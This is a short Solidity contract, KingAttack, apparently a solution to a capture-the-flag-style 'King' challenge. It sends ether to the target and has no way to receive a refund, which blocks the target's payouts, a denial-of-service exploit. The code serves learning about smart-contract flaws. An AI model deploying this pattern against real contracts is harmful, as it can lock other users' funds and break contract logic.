// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";
import "hardhat/console.sol";

contract KingAttack {
    function attack(address _kingAddress) public payable {
        (bool success, ) = _kingAddress.call{value: msg.value}("");
        console.log(success);
        require(success, "Failed to send value!");
    }
}
